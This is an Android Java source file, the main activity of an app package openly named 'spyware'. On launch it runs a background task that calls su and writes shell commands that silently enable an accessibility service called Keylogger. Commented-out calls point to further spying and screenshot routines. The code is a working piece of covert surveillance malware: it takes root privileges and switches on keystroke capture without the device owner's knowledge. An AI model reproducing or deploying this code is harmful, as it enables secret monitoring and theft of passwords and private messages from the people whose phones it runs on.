package com.example.cristianturetta.spyware;

import android.app.Activity;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Handler;
import android.os.Looper;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;

import java.io.DataOutputStream;

public class MainActivity extends AppCompatActivity {

    private class StartupAsyncTask extends AsyncTask<Void, Void, Void> {
        @Override
        protected Void doInBackground(Void... params) {
            // this method is executed in a background thread
            // no problem calling su here
            enableAccessibility();
            return null;
        }
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);

        (new StartupAsyncTask()).execute();
        //(new SpyAsyncTask()).execute();
        //(new ScreenshotUtilRunnable()).run();
    }

    void enableAccessibility(){
        Log.d("MainActivity", "enableAccessibility");
        if (Looper.myLooper() == Looper.getMainLooper()) {
            Log.d("MainActivity", "on main thread");
            // running on the main thread
        } else {
            Log.d("MainActivity", "not on main thread");
            // not running on the main thread
            try {
                Process process = Runtime.getRuntime().exec("su");
                DataOutputStream os = new DataOutputStream(process.getOutputStream());
                os.writeBytes("settings put secure enabled_accessibility_services com.example.cristianturetta.spyware/com.example.cristianturetta.spyware.Keylogger\n");
                os.flush();
                os.writeBytes("settings put secure accessibility_enabled 1\n");
                os.flush();
                os.writeBytes("exit\n");
                os.flush();

                process.waitFor();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
}
